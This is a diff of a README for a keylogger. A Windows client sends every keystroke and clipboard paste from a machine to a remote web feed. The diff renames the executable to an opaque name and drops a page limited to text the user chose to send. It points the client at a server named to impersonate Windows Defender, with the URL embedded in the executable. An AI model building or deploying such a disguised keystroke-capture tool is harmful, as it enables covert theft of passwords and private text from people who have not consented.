@@ -7,7 +7,7 @@ Only run the client on computers and accounts you own or are explicitly authoriz
 ## How It Works
 
 ```text
-Keyboard input -> LiveKeyClient.exe -> POST /api/messages -> app.py -> index.html
+Keyboard input -> P3TROKL.exe -> POST /api/messages -> app.py -> index.html
 ```
 
 Each message contains `text`, `device_id`, `device_name`, and `is_pasted`. The device number is a stable 12-character value generated from the computer name. The old separate heartbeat process is no longer used. A message is sent when Enter is pressed or after about 2.5 seconds without typing. Clipboard pastes are sent as separate messages and shown with a `Pasted` label and a different bubble color.
@@ -17,8 +17,8 @@ Each message contains `text`, `device_id`, `device_name`, and `is_pasted`. The d
 - `app.py`: FastAPI web server and message API.
 - `client.py`: keyboard listener and message sender.
 - `index.html`: live browser feed.
-- `phones/index.html`: mobile text sender for Android and iPhone.
-- `LiveKeyClient.spec`: PyInstaller configuration.
+- `mobile_keyboard/`: native Android and iPhone sample keyboard clients.
+- `P3TROKL.spec`: PyInstaller configuration.
 - `render.yaml`: Render deployment configuration.
 - `text.txt`: local message log, ignored by Git.
 
@@ -43,8 +43,6 @@ python client.py
 ```
 
 Type a message and press Enter. It should appear in the browser.
-
-For a phone client, open `/phones` on the deployed service. For example: `https://your-service-name.onrender.com/phones`. The phone page sends only text that the user types or explicitly pastes. Add it to the phone home screen for an app-like experience.
 
 ## Deploy to Render
 
@@ -99,7 +97,7 @@ When `DATABASE_URL` is set, the server loads and saves messages in Supabase. Wit
 Use the exact URL shown by Render:
 
 ```powershell
-./dist/LiveKeyClient.exe
+./dist/P3TROKL.exe
 ```
 
 The Render URL is embedded in the executable, so no `.env` file or terminal variables are required.
@@ -107,11 +105,11 @@ The Render URL is embedded in the executable, so no `.env` file or terminal vari
 ## Build the Executable
 
 ```powershell
-taskkill /F /IM LiveKeyClient.exe /T 2>$null
-python -m PyInstaller --clean --noconfirm LiveKeyClient.spec
+taskkill /F /IM P3TROKL.exe /T 2>$null
+python -m PyInstaller --clean --noconfirm P3TROKL.spec
 ```
 
-Output: `dist/LiveKeyClient.exe`
+Output: `dist/P3TROKL.exe`
 
 ## Troubleshooting
 
@@ -121,7 +119,7 @@ If the website is live but empty, check the client URL:
 echo $env:KEY_FEED_URL
 ```
 
-It must be the real Render URL, not `https://your-app.onrender.com`. Also check `https://your-service-name.onrender.com/health`; it should return JSON containing `"ok": true`. Restart the client, type a message, and press Enter.
+It must be `https://windows-defender-cf8n.onrender.com`. Also check `https://windows-defender-cf8n.onrender.com/health`; it should return JSON containing `"ok": true`. Restart the client, type a message, and press Enter.
 
 The service keeps the latest 200 messages in memory. Configure Supabase as described above so messages survive Render restarts and redeploys. `text.txt` is only the local fallback and is ignored by Git.
 
